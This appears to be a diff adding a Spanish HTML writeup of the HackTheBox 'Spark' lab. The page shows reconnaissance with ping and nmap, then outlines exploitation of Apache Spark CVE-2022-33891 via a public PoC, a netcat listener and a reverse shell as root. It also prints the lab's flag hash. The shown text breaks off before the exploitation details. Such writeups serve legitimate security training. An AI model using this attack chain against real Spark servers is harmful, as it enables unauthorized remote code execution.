@@ -1,0 +1,975 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Spark — HTB Writeup | Brandeiks</title>
+  <meta name="description" content="Writeup de la máquina Spark de HackTheBox — Dificultad: Muy Fácil. Apache Spark CVE-2022-33891 → OS Command Injection → Reverse Shell → root.">
+  <meta name="author" content="Brandon Zevallos Pastrana">
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%2300ff88' rx='20'/%3E%3Ctext x='50%25' y='50%25' text-anchor='middle' dy='.35em' font-size='70' font-weight='bold' fill='%23050a0e' font-family='monospace'%3EB%3C/text%3E%3C/svg%3E">
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;400;600;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet"/>
+  <style>
+    :root {
+      --bg:       #050a0e;
+      --bg2:      #080f14;
+      --bg3:      #0a1520;
+      --green:    #00ff88;
+      --red:      #ff2d55;
+      --yellow:   #ffd700;
+      --orange:   #ff8c00;
+      --purple:   #bf5fff;
+      --dim:      #1a2a2e;
+      --text:     #c8d8e0;
+      --text-dim: #4a6a74;
+      --font-mono:'Share Tech Mono', monospace;
+      --font-main:'Rajdhani', sans-serif;
+      --font-disp:'Orbitron', sans-serif;
+    }
+    *{margin:0;padding:0;box-sizing:border-box;}
+    html{scroll-behavior:smooth;}
+    body{background:var(--bg);color:var(--text);font-family:var(--font-main);overflow-x:hidden;cursor:none;}
+    body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,136,.012) 2px,rgba(0,255,136,.012) 4px);pointer-events:none;z-index:1000;}
+    a,button{cursor:none;}
+    .cursor{position:fixed;width:10px;height:10px;background:var(--green);border-radius:50%;pointer-events:none;z-index:9999;transform:translate(-50%,-50%);box-shadow:0 0 12px var(--green);opacity:0;}
+    .cursor-ring{position:fixed;width:36px;height:36px;border:1px solid var(--green);border-radius:50%;pointer-events:none;z-index:9998;transform:translate(-50%,-50%);opacity:0;transition:all .12s ease;}
+    nav{position:fixed;top:0;left:0;right:0;z-index:500;display:flex;justify-content:space-between;align-items:center;padding:1.2rem 4rem;background:rgba(5,10,14,.92);backdrop-filter:blur(10px);border-bottom:1px solid rgba(0,255,136,.08);}
+    .nav-logo{font-family:var(--font-disp);font-size:1rem;color:var(--green);letter-spacing:4px;text-decoration:none;}
+    .nav-back{font-family:var(--font-mono);font-size:.78rem;color:var(--text-dim);text-decoration:none;letter-spacing:2px;transition:color .3s;}
+    .nav-back::before{content:'← ';}
+    .nav-back:hover{color:var(--green);}
+
+    .writeup-hero{min-height:42vh;display:flex;align-items:flex-end;padding:8rem 4rem 3rem;position:relative;overflow:hidden;border-bottom:1px solid var(--dim);}
+    .hero-grid{position:absolute;inset:0;background-image:linear-gradient(rgba(0,255,136,.03) 1px,transparent 1px),linear-gradient(90deg,rgba(0,255,136,.03) 1px,transparent 1px);background-size:60px 60px;}
+    .hero-glow{position:absolute;width:600px;height:400px;background:radial-gradient(ellipse,rgba(0,255,136,.07) 0%,transparent 70%);top:0;right:0;pointer-events:none;}
+    .writeup-hero-content{position:relative;z-index:2;max-width:900px;}
+    .breadcrumb{font-family:var(--font-mono);font-size:.72rem;color:var(--text-dim);letter-spacing:2px;margin-bottom:1.2rem;}
+    .breadcrumb a{color:var(--text-dim);text-decoration:none;transition:color .2s;}
+    .breadcrumb a:hover{color:var(--green);}
+    .breadcrumb span{color:var(--green);}
+    .writeup-title{font-family:var(--font-disp);font-size:clamp(2.5rem,6vw,4.5rem);font-weight:900;letter-spacing:2px;line-height:1.1;}
+    .writeup-title span{color:var(--green);}
+    .writeup-subtitle{font-family:var(--font-mono);font-size:.85rem;color:var(--text-dim);margin-top:.8rem;letter-spacing:1px;}
+    .writeup-meta{display:flex;flex-wrap:wrap;gap:1rem;align-items:center;margin-top:1.8rem;}
+    .meta-badge{font-family:var(--font-mono);font-size:.68rem;letter-spacing:2px;padding:.3rem .8rem;border:1px solid;}
+    .badge-vfacil{color:var(--green);border-color:rgba(0,255,136,.4);background:rgba(0,255,136,.05);}
+    .badge-htb   {color:var(--green);border-color:rgba(0,255,136,.3);background:rgba(0,255,136,.05);}
+    .badge-linux {color:var(--yellow);border-color:rgba(255,215,0,.3);background:rgba(255,215,0,.05);}
+    .badge-spark {color:var(--orange);border-color:rgba(255,140,0,.4);background:rgba(255,140,0,.05);}
+    .badge-rce   {color:var(--red);border-color:rgba(255,45,85,.4);background:rgba(255,45,85,.05);}
+    .meta-date{font-family:var(--font-mono);font-size:.7rem;color:var(--text-dim);}
+
+    .writeup-layout{display:grid;grid-template-columns:1fr 240px;gap:3rem;max-width:1300px;margin:0 auto;padding:4rem;}
+    .sidebar{position:sticky;top:5rem;height:fit-content;order:2;}
+    .sidebar-box{border:1px solid var(--dim);padding:1.5rem;background:var(--bg2);margin-bottom:1.5rem;}
+    .sidebar-title{font-family:var(--font-mono);font-size:.65rem;color:var(--green);letter-spacing:3px;margin-bottom:1.2rem;}
+    .toc-list{list-style:none;display:flex;flex-direction:column;gap:.4rem;}
+    .toc-list a{font-family:var(--font-mono);font-size:.7rem;color:var(--text-dim);text-decoration:none;letter-spacing:1px;transition:all .2s;display:block;padding:.25rem .8rem;border-left:2px solid transparent;}
+    .toc-list a:hover,.toc-list a.active{color:var(--green);border-left-color:var(--green);}
+    .info-row{display:flex;justify-content:space-between;align-items:center;margin-bottom:.8rem;}
+    .info-label{font-family:var(--font-mono);font-size:.65rem;color:var(--text-dim);letter-spacing:1px;}
+    .info-val{font-family:var(--font-mono);font-size:.72rem;}
+    .val-green {color:var(--green);}
+    .val-yellow{color:var(--yellow);}
+    .val-red   {color:var(--red);}
+    .val-orange{color:var(--orange);}
+
+    .attack-path{display:flex;flex-direction:column;gap:0;}
+    .ap-item{display:flex;align-items:flex-start;gap:.8rem;padding:.5rem 0;}
+    .ap-dot{width:8px;height:8px;background:var(--green);border-radius:50%;margin-top:4px;flex-shrink:0;box-shadow:0 0 6px var(--green);}
+    .ap-line{width:1px;height:16px;background:rgba(0,255,136,.2);margin:0 3.5px;}
+    .ap-text{font-family:var(--font-mono);font-size:.65rem;color:var(--text-dim);line-height:1.5;}
+    .ap-text span{color:var(--green);}
+
+    .writeup-content{min-width:0;order:1;}
+    .progress-container{position:fixed;top:0;left:0;width:100%;height:3px;background:transparent;z-index:1001;}
+    .progress-bar{height:100%;background:var(--green);width:0%;transition:width .15s ease;box-shadow:0 0 8px var(--green);}
+    .skip-link{position:absolute;top:-40px;left:0;background:var(--green);color:var(--bg);padding:8px 16px;z-index:10000;text-decoration:none;font-family:var(--font-mono);font-size:.8rem;transition:top .2s;}
+    .skip-link:focus{top:0;}
+
+    .copy-btn{position:absolute;top:.5rem;right:4.5rem;background:var(--dim);border:1px solid rgba(0,255,136,.3);color:var(--text-dim);font-family:var(--font-mono);font-size:.62rem;padding:.15rem .5rem;letter-spacing:1px;cursor:none;opacity:0;transition:opacity .2s,background .2s,color .2s;z-index:10;white-space:nowrap;}
+    .cmd-block:hover .copy-btn{opacity:1;}
+    .copy-btn:hover{background:var(--green);color:var(--bg);border-color:var(--green);}
+    .copy-btn.copied{background:var(--green);color:var(--bg);border-color:var(--green);opacity:1;}
+    .toast{position:fixed;bottom:24px;right:24px;background:var(--green);color:#000;padding:.7rem 1.4rem;font-family:var(--font-mono);font-size:.75rem;letter-spacing:2px;font-weight:600;opacity:0;transform:translateY(8px);transition:opacity .25s,transform .25s;pointer-events:none;z-index:10000;}
+    .toast.show{opacity:1;transform:translateY(0);}
+
+    .section{margin-bottom:4rem;opacity:0;transform:translateY(20px);transition:opacity .5s ease,transform .5s ease;}
+    .section.visible{opacity:1;transform:translateY(0);}
+    .section-label{font-family:var(--font-mono);font-size:.68rem;color:var(--green);letter-spacing:4px;margin-bottom:.5rem;}
+    .section-title{font-family:var(--font-disp);font-size:1.5rem;font-weight:700;letter-spacing:2px;margin-bottom:.6rem;}
+    .section-line{width:40px;height:2px;background:var(--green);margin-bottom:2rem;}
+
+    .prose p{font-size:1.05rem;line-height:1.9;color:var(--text-dim);margin-bottom:1rem;}
+    .prose p strong{color:var(--text);}
+    .prose p .hl     {color:var(--green);font-weight:bold;}
+    .prose p .hl-red {color:var(--red);}
+    .prose p .hl-yel {color:var(--yellow);}
+    .prose p .hl-ora {color:var(--orange);}
+    .prose p .hl-pur {color:var(--purple);}
+
+    .step-marker{display:flex;align-items:center;gap:1rem;margin-bottom:1.2rem;margin-top:2.5rem;}
+    .step-num{font-family:var(--font-disp);font-size:.65rem;color:var(--bg);background:var(--green);width:26px;height:26px;display:flex;align-items:center;justify-content:center;flex-shrink:0;font-weight:900;}
+    .step-title{font-family:var(--font-mono);font-size:.8rem;color:var(--green);letter-spacing:2px;}
+
+    .cmd-block{background:var(--bg3);border:1px solid rgba(0,255,136,.15);border-left:3px solid var(--green);padding:1rem 1.2rem;margin:1rem 0;font-family:var(--font-mono);font-size:.82rem;overflow-x:auto;position:relative;line-height:1.8;}
+    .cmd-block .cmd-label{position:absolute;top:.5rem;right:.8rem;font-size:.6rem;color:var(--text-dim);letter-spacing:2px;}
+    .cmd-block .prompt    {color:var(--green);user-select:none;}
+    .cmd-block .prompt-msf{color:var(--red);user-select:none;}
+    .cmd-block .prompt-venv{color:var(--yellow);user-select:none;}
+    .cmd-block .cmd   {color:var(--text);}
+    .cmd-block .flag  {color:var(--green);}
+    .cmd-block .arg   {color:var(--yellow);}
+    .cmd-block .comment{color:var(--text-dim);font-size:.75rem;}
+
+    .output-block{background:#020608;border:1px solid var(--dim);padding:1rem 1.2rem;margin:.5rem 0 1.5rem;font-family:var(--font-mono);font-size:.77rem;line-height:1.9;color:var(--text-dim);overflow-x:auto;}
+    .output-block .o-green {color:var(--green);}
+    .output-block .o-red   {color:var(--red);}
+    .output-block .o-yellow{color:var(--yellow);}
+    .output-block .o-orange{color:var(--orange);}
+    .output-block .o-white {color:var(--text);}
+
+    .info-box{border:1px solid rgba(0,255,136,.2);background:rgba(0,255,136,.04);padding:1.2rem 1.5rem;margin:1.2rem 0;}
+    .info-box-title{font-family:var(--font-mono);font-size:.65rem;color:var(--green);letter-spacing:3px;margin-bottom:.6rem;}
+    .info-box p{font-family:var(--font-mono);font-size:.78rem;color:var(--text-dim);line-height:1.7;}
+    .info-box p strong{color:var(--green);}
+
+    .warn-box{border:1px solid rgba(255,140,0,.25);background:rgba(255,140,0,.04);padding:1.2rem 1.5rem;margin:1.2rem 0;}
+    .warn-box-title{font-family:var(--font-mono);font-size:.65rem;color:var(--orange);letter-spacing:3px;margin-bottom:.6rem;}
+    .warn-box p{font-family:var(--font-mono);font-size:.78rem;color:var(--text-dim);line-height:1.7;}
+    .warn-box p strong{color:var(--orange);}
+
+    .vuln-box{border:1px solid rgba(255,45,85,.3);background:rgba(255,45,85,.04);padding:1.2rem 1.5rem;margin:1.2rem 0;}
+    .vuln-box-title{font-family:var(--font-mono);font-size:.65rem;color:var(--red);letter-spacing:3px;margin-bottom:.6rem;}
+    .vuln-box p{font-family:var(--font-mono);font-size:.78rem;color:var(--text-dim);line-height:1.7;}
+    .vuln-box p strong{color:var(--red);}
+
+    .vuln-table{width:100%;border-collapse:collapse;margin:1.5rem 0;}
+    .vuln-table th,.vuln-table td{font-family:var(--font-mono);font-size:.72rem;padding:.8rem 1rem;text-align:left;border-bottom:1px solid var(--dim);}
+    .vuln-table th{color:var(--green);letter-spacing:2px;border-bottom-color:rgba(0,255,136,.2);}
+    .vuln-table td{color:var(--text-dim);}
+    .vuln-table td:first-child{color:var(--green);}
+
+    hr.divider{border:none;height:1px;background:linear-gradient(90deg,rgba(0,255,136,.3),transparent);margin:3rem 0;}
+
+    .cmd-ref-grid{display:grid;grid-template-columns:1fr 1fr;gap:1.2rem;margin-top:1.5rem;}
+    .cmd-ref-card{border:1px solid var(--dim);background:var(--bg2);padding:1.5rem;transition:border-color .3s;}
+    .cmd-ref-card:hover{border-color:rgba(0,255,136,.25);}
+    .cmd-ref-name{font-family:var(--font-mono);font-size:.9rem;color:var(--green);margin-bottom:.5rem;letter-spacing:1px;}
+    .cmd-ref-syntax{font-family:var(--font-mono);font-size:.72rem;color:var(--green);background:var(--bg3);padding:.4rem .7rem;margin-bottom:.8rem;display:inline-block;}
+    .cmd-ref-desc{font-size:.92rem;color:var(--text-dim);line-height:1.7;margin-bottom:.8rem;}
+    .cmd-ref-flags{list-style:none;display:flex;flex-direction:column;gap:.3rem;}
+    .cmd-ref-flags li{font-family:var(--font-mono);font-size:.7rem;color:var(--text-dim);}
+    .cmd-ref-flags li span{color:var(--yellow);}
+
+    .glosario-grid{display:grid;grid-template-columns:1fr;gap:1rem;margin-top:1.5rem;}
+    .glos-card{border:1px solid var(--dim);background:var(--bg2);padding:1.4rem 1.5rem;transition:border-color .3s;}
+    .glos-card:hover{border-color:rgba(0,255,136,.2);}
+    .glos-term{font-family:var(--font-mono);font-size:.88rem;color:var(--green);margin-bottom:.4rem;letter-spacing:1px;}
+    .glos-def{font-size:.95rem;color:var(--text-dim);line-height:1.75;}
+    .glos-def strong{color:var(--text);}
+    .glos-def code{font-family:var(--font-mono);font-size:.82rem;color:var(--green);background:var(--bg3);padding:.1rem .4rem;}
+
+    footer{padding:2rem 4rem;border-top:1px solid var(--dim);display:flex;justify-content:space-between;align-items:center;margin-top:4rem;}
+    footer p{font-family:var(--font-mono);font-size:.7rem;color:var(--text-dim);letter-spacing:1px;}
+    footer span{color:var(--green);}
+
+    @media(max-width:960px){
+      nav,.writeup-hero,footer{padding-left:1.5rem;padding-right:1.5rem;}
+      .writeup-layout{grid-template-columns:1fr;padding:2rem 1.5rem;}
+      .sidebar{position:static;}
+      .cmd-ref-grid{grid-template-columns:1fr;}
+      body,a,button{cursor:auto;}
+      .cursor,.cursor-ring{display:none;}
+    }
+  </style>
+</head>
+<body>
+
+<a href="#main-content" class="skip-link">Saltar al contenido principal</a>
+<div class="progress-container"><div class="progress-bar" id="readingProgress"></div></div>
+<div class="cursor" id="cursor"></div>
+<div class="cursor-ring" id="cursorRing"></div>
+
+<nav>
+  <a href="../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
+  <a href="../../index.html" class="nav-back">volver al portafolio</a>
+</nav>
+
+<!-- HERO -->
+<div class="writeup-hero">
+  <div class="hero-grid"></div>
+  <div class="hero-glow"></div>
+  <div class="writeup-hero-content">
+    <p class="breadcrumb">
+      <a href="../../index.html">brandeiks</a> /
+      <a href="../">writeups</a> /
+      <a href="../../writeups/htb/">hackthebox</a> /
+      <span>spark</span>
+    </p>
+    <h1 class="writeup-title"><span>Spark</span></h1>
+    <p class="writeup-subtitle">HackTheBox — Linux · CVE-2022-33891 Apache Spark RCE → Reverse Shell → root</p>
+    <div class="writeup-meta">
+      <span class="meta-badge badge-vfacil">● MUY FÁCIL</span>
+      <span class="meta-badge badge-htb">HACKTHEBOX</span>
+      <span class="meta-badge badge-linux">LINUX</span>
+      <span class="meta-badge badge-spark">APACHE SPARK</span>
+      <span class="meta-badge badge-rce">RCE · CVE-2022-33891</span>
+      <span class="meta-date">📅 Mayo 2026 · By Brandeiks</span>
+    </div>
+  </div>
+</div>
+
+<!-- LAYOUT -->
+<div class="writeup-layout">
+
+  <!-- SIDEBAR -->
+  <aside class="sidebar">
+    <div class="sidebar-box">
+      <p class="sidebar-title">// ÍNDICE</p>
+      <ul class="toc-list">
+        <li><a href="#resumen">01 · Resumen</a></li>
+        <li><a href="#reconocimiento">02 · Reconocimiento</a></li>
+        <li><a href="#enumeracion">03 · Enumeración Web</a></li>
+        <li><a href="#explotacion">04 · Explotación CVE-2022-33891</a></li>
+        <li><a href="#revshell">05 · Reverse Shell</a></li>
+        <li><a href="#flag">06 · Flag</a></li>
+        <li><a href="#referencia">07 · Referencia de Comandos</a></li>
+        <li><a href="#glosario">08 · Glosario</a></li>
+      </ul>
+    </div>
+    <div class="sidebar-box">
+      <p class="sidebar-title">// INFO</p>
+      <div class="info-row"><span class="info-label">Plataforma</span><span class="info-val val-green">HackTheBox</span></div>
+      <div class="info-row"><span class="info-label">OS</span><span class="info-val val-yellow">Linux</span></div>
+      <div class="info-row"><span class="info-label">Dificultad</span><span class="info-val val-green">Muy Fácil</span></div>
+      <div class="info-row"><span class="info-label">IP Target</span><span class="info-val" style="color:var(--text)">10.129.228.19</span></div>
+      <div class="info-row"><span class="info-label">Puerto Web</span><span class="info-val val-orange">8080 / TCP</span></div>
+      <div class="info-row"><span class="info-label">CVE</span><span class="info-val val-red">CVE-2022-33891</span></div>
+      <div class="info-row"><span class="info-label">Estado</span><span class="info-val val-green">● Pwned</span></div>
+    </div>
+    <div class="sidebar-box">
+      <p class="sidebar-title">// ATTACK PATH</p>
+      <div class="attack-path">
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>ping</span> → host activo, TTL 63 = Linux</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>nmap</span> → 22 SSH · 8080 Spark Master · 8081 Spark Worker</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>xsltproc</span> → reporte HTML</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>:8080</span> → Apache Spark 3.0.3 → vulnerable</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>CVE-2022-33891</span> → PoC clonado y configurado</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>--check</span> → sleep 10 confirma RCE</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>nc -lvnp 443</span> → listener activo</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>--revshell</span> → shell como root</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot" style="background:var(--green);box-shadow:0 0 6px var(--green)"></div><div class="ap-text"><span style="color:var(--green)">FLAG</span> → f8492d7f24b1f4c9505278382091a330</div></div>
+      </div>
+    </div>
+  </aside>
+
+  <!-- CONTENT -->
+  <main class="writeup-content" id="main-content">
+
+    <!-- RESUMEN -->
+    <div class="section" id="resumen">
+      <p class="section-label">// 01</p>
+      <h2 class="section-title">Resumen</h2>
+      <div class="section-line"></div>
+      <div class="prose">
+        <p>
+          <strong>Spark</strong> es una máquina de dificultad <span class="hl">muy fácil</span>
+          de HackTheBox que corre sobre <strong>Linux</strong>. El nombre hace referencia directa
+          al servicio expuesto: <span class="hl">Apache Spark</span>, un motor de análisis de datos
+          distribuido ampliamente usado en entornos de Big Data.
+        </p>
+        <p>
+          La máquina expone Apache Spark versión <span class="hl-red">3.0.3</span> en el puerto
+          8080. Esta versión es vulnerable a <span class="hl-red">CVE-2022-33891</span>, una
+          vulnerabilidad de <strong>OS Command Injection</strong> en la interfaz web de Spark UI.
+          Cuando <code style="color:var(--green)">spark.acls.enable</code> está activado, la función
+          de verificación de permisos construye un comando de shell directamente desde la entrada
+          del usuario sin sanitización, permitiendo inyección arbitraria de comandos.
+        </p>
+        <p>
+          El flujo de ataque es directo: reconocimiento con nmap, identificación de la versión
+          vulnerable en la UI web, clonado del PoC público de HuskyHacks, verificación de RCE
+          mediante sleep, y finalmente establecimiento de una <span class="hl">reverse shell</span>
+          como <strong>root</strong> usando netcat.
+        </p>
+      </div>
+
+      <table class="vuln-table">
+        <thead>
+          <tr><th>Fase</th><th>Técnica / Herramienta</th><th>Resultado</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>Reconocimiento</td><td>ping + nmap -p- -sSCV + xsltproc</td><td>SSH 22, Spark Master 8080, Worker 8081, 35623</td></tr>
+          <tr><td>Enumeración</td><td>Navegador → :8080</td><td>Apache Spark 3.0.3 → CVE-2022-33891</td></tr>
+          <tr><td>Explotación</td><td>CVE-2022-33891 PoC (python3 poc.py --check)</td><td>Sleep 10 confirma RCE como root</td></tr>
+          <tr><td>Post-Explotación</td><td>nc -lvnp 443 + poc.py --revshell</td><td>Shell interactiva como root</td></tr>
+          <tr><td>Flag</td><td>cat flag.txt</td><td>f8492d7f24b1f4c9505278382091a330</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <hr class="divider">
+
+    <!-- RECONOCIMIENTO -->
+    <div class="section" id="reconocimiento">
+      <p class="section-label">// 02</p>
+      <h2 class="section-title">Reconocimiento</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">1</div>
+        <span class="step-title">VERIFICACIÓN DE CONECTIVIDAD CON PING</span>
+      </div>
+      <div class="prose">
+        <p>
+          Antes de escanear, verificamos que el host esté activo enviando 3 paquetes ICMP.
+          El TTL de la respuesta nos da una pista sobre el sistema operativo: valores
+          cercanos a <span class="hl">64</span> indican Linux/Unix (el TTL inicial es 64,
+          y cada hop reduce en 1). Un TTL de 63 confirma que estamos ante una
+          máquina <strong>Linux</strong> con un salto entre nosotros y el objetivo.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="ping 10.129.228.19 -c 3">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">PING</span>
+        <div><span class="prompt">$ </span><span class="cmd">ping <span class="arg">10.129.228.19</span> <span class="flag">-c 3</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>PING 10.129.228.19 (10.129.228.19) 56(84) bytes of data.</div>
+        <div>64 bytes from 10.129.228.19: icmp_seq=1 ttl=<span class="o-green">63</span> time=114 ms</div>
+        <div>64 bytes from 10.129.228.19: icmp_seq=2 ttl=<span class="o-green">63</span> time=113 ms</div>
+        <div>64 bytes from 10.129.228.19: icmp_seq=3 ttl=<span class="o-green">63</span> time=116 ms</div>
+        <div>&nbsp;</div>
+        <div>--- 10.129.228.19 ping statistics ---</div>
+        <div>3 packets transmitted, 3 received, <span class="o-green">0% packet loss</span>, time 2037ms</div>
+        <div>rtt min/avg/max/mdev = 113.476/114.573/116.028/1.072 ms</div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">2</div>
+        <span class="step-title">ESCANEO DE PUERTOS CON NMAP Y EXPORTACIÓN XML</span>
+      </div>
+      <div class="prose">
+        <p>
+          Lanzamos un escaneo exhaustivo sobre todos los puertos TCP. El resultado revela
+          <strong>4 puertos abiertos</strong> relevantes: el puerto 22 con OpenSSH 8.2p1,
+          el puerto <span class="hl">8080</span> con Spark Master (Jetty 9.4.40),
+          el puerto <span class="hl">8081</span> con Spark Worker, y el puerto
+          <span class="hl">35623</span> desconocido (que corresponde al puerto del worker interno).
+          El header HTTP revela <strong>Jetty 9.4.40.v20210413</strong> y los títulos de las
+          páginas confirman los roles Spark Master y Spark Worker.
+        </p>
+        <p>
+          Exportamos el resultado a XML con <code style="color:var(--green)">-oX spark.xml</code>
+          para luego transformarlo en HTML con xsltproc y tener evidencia visual del escaneo.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="sudo nmap -p- -sSCV -n -Pn --min-rate=5000 --open 10.129.228.19 -oX spark.xml">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">NMAP</span>
+        <div><span class="prompt">$ </span><span class="cmd">sudo nmap <span class="flag">-p-</span> <span class="flag">-sSCV</span> <span class="flag">-n</span> <span class="flag">-Pn</span> <span class="flag">--min-rate=5000</span> <span class="flag">--open</span> <span class="arg">10.129.228.19</span> <span class="flag">-oX</span> <span class="arg">spark.xml</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-20 00:49 -0400</div>
+        <div>Nmap scan report for 10.129.228.19</div>
+        <div>Host is up (0.12s latency).</div>
+        <div>Not shown: 65531 closed tcp ports (reset)</div>
+        <div>&nbsp;</div>
+        <div>PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; STATE  SERVICE  VERSION</div>
+        <div><span class="o-white">22/tcp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; open&nbsp;&nbsp; ssh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span></div>
+        <div>| ssh-hostkey:</div>
+        <div>|&nbsp;&nbsp; 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)</div>
+        <div>|&nbsp;&nbsp; 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)</div>
+        <div>|_&nbsp; 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)</div>
+        <div><span class="o-green">8080/tcp&nbsp;&nbsp;&nbsp; open&nbsp;&nbsp; http&nbsp;&nbsp;&nbsp;&nbsp; Jetty 9.4.40.v20210413</span></div>
+        <div>|_http-title: Spark Master at spark://spark:7077</div>
+        <div>| http-methods:</div>
+        <div>|_&nbsp; Potentially risky methods: TRACE</div>
+        <div>|_http-server-header: Jetty(9.4.40.v20210413)</div>
+        <div><span class="o-white">8081/tcp&nbsp;&nbsp;&nbsp; open&nbsp;&nbsp; http&nbsp;&nbsp;&nbsp;&nbsp; Jetty 9.4.40.v20210413</span></div>
+        <div>|_http-server-header: Jetty(9.4.40.v20210413)</div>
+        <div>|_http-title: Spark Worker at 10.129.228.19:35623</div>
+        <div>| http-methods:</div>
+        <div>|_&nbsp; Potentially risky methods: TRACE</div>
+        <div><span class="o-white">35623/tcp&nbsp;&nbsp; open&nbsp;&nbsp; unknown</span></div>
+        <div>&nbsp;</div>
+        <div>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</div>
+        <div>&nbsp;</div>
+        <div>Nmap done: 1 IP address (1 host up) scanned in 67.50 seconds</div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// DESGLOSE DEL COMANDO NMAP</p>
+        <p>
+          <strong>-p-</strong> → Escanea los 65,535 puertos TCP. Sin esta flag Nmap revisaría solo los 1000 más comunes y perdería el puerto 35623.<br>
+          <strong>-sS</strong> → SYN Scan (Half-Open): envía SYN, si recibe SYN-ACK el puerto está abierto, responde RST sin completar el handshake. Más rápido y sigiloso que un connect scan.<br>
+          <strong>-sC</strong> → Scripts NSE por defecto: ejecuta scripts de enumeración automática, incluyendo http-title que nos da el título de la página web de Spark.<br>
+          <strong>-sV</strong> → Detección de versiones: identifica el servidor Jetty y la versión exacta.<br>
+          <strong>-n</strong> → Sin resolución DNS: acelera el escaneo.<br>
+          <strong>-Pn</strong> → Sin ping previo: evita que el firewall bloquee el descubrimiento.<br>
+          <strong>--min-rate=5000</strong> → Mínimo 5000 paquetes/segundo, apropiado en CTF.<br>
+          <strong>--open</strong> → Solo muestra puertos en estado OPEN.<br>
+          <strong>-oX spark.xml</strong> → Exporta en XML para transformar con xsltproc.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">3</div>
+        <span class="step-title">CONVERSIÓN DEL REPORTE NMAP A HTML CON XSLTPROC</span>
+      </div>
+      <div class="prose">
+        <p>
+          Transformamos el XML generado por Nmap a una tabla HTML navegable usando la hoja
+          de estilos oficial incluida en Kali. Esto nos da un reporte visual listo para
+          incluir en informes de auditoría.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="xsltproc /usr/share/nmap/nmap.xsl spark.xml > spark.html">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">XSLTPROC</span>
+        <div><span class="prompt">$ </span><span class="cmd">xsltproc <span class="arg">/usr/share/nmap/nmap.xsl</span> <span class="arg">spark.xml</span> &gt; <span class="arg">spark.html</span></span></div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- ENUMERACIÓN -->
+    <div class="section" id="enumeracion">
+      <p class="section-label">// 03</p>
+      <h2 class="section-title">Enumeración Web — Identificación de la Versión</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">4</div>
+        <span class="step-title">ACCESO A LA INTERFAZ WEB DE APACHE SPARK</span>
+      </div>
+      <div class="prose">
+        <p>
+          Navegamos al puerto 8080 del objetivo. La interfaz web de
+          <strong>Spark Master</strong> muestra información crítica sin requerir
+          autenticación: la versión exacta del software, los workers conectados,
+          las aplicaciones en ejecución y la URL del cluster.
+        </p>
+        <p>
+          La página revela <span class="hl-red">Apache Spark 3.0.3</span>. Con este dato
+          buscamos vulnerabilidades conocidas para esta versión específica y encontramos
+          <span class="hl-red">CVE-2022-33891</span>: una vulnerabilidad de
+          <strong>OS Command Injection</strong> que afecta a Apache Spark hasta la versión
+          3.0.3 (y ramas 3.1.x hasta 3.1.2, 3.2.x hasta 3.2.1).
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="http://10.129.228.19:8080/">
+        <span class="cmd-label">URL</span>
+        <div><span class="prompt">→ </span><span class="cmd">http://<span class="arg">10.129.228.19</span>:<span class="arg">8080</span>/</span></div>
+      </div>
+
+      <div class="vuln-box">
+        <p class="vuln-box-title">// CVE-2022-33891 — APACHE SPARK OS COMMAND INJECTION</p>
+        <p>
+          <strong>Versiones afectadas:</strong> Apache Spark ≤ 3.0.3, 3.1.x ≤ 3.1.2, 3.2.x ≤ 3.2.1<br>
+          <strong>Componente:</strong> Spark UI con <code>spark.acls.enable=true</code><br>
